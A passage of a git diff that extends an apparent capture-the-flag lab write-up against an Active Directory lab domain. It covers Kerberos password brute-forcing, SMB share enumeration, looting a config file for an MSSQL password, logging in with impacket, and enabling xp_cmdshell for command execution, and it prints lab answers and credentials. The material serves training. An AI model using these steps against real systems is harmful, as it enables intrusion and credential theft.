@@ -78,14 +78,49 @@ Using kerbrute to brute force the passwords:
 cat combos.txt | kerbrute bruteforce -d inlanefreight.local --dc 172.16.7.3 -
 ```
 
-After finding the combo validate it against the SMB share:
+Listing the shares:
+```
+smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3
+```
+
+
+After finding the combo validate it against the Deparement SMB share:
 ```
 smbclient //172.16.7.3/'Department Shares' -U 'INLANEFREIGHT\\BR086'%'Welcome1'
 ```
 
 Q4 Answer: BR086
+
 Q5 Answer: Welcome1
 
 ## Q6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file? 
 
+Lisiting the files on the shares:
+```
+recurse on
+ls
+```
+
+There we can find the file inside the IT Department :
+<img width="1023" height="145" alt="Screenshot 2026-02-28 111144" src="https://github.com/user-attachments/assets/aa1416c9-cbea-4312-a89f-868fb83ddcb4" />
+
+Then lets take the file on our system using the `get` command and grep for password:
+<img width="1900" height="162" alt="Screenshot 2026-02-28 111302" src="https://github.com/user-attachments/assets/086e4262-cc90-4c10-b5e1-5b2f740521d5" />
+
+**D@ta_bAse_adm1n!**
+
+## Q7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
+
+Now we have the password as well as the username (i.e ID) so we can connect to the sql server using impacket suite:
+```
+impacket-mssqlclient netdb:D@ta_bAse_adm1n!@172.16.7.60
+```
+
+Now lets enable the xp_cmdshell (a function that takes strings and pass it to cmd shell for execution)
+```
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
 
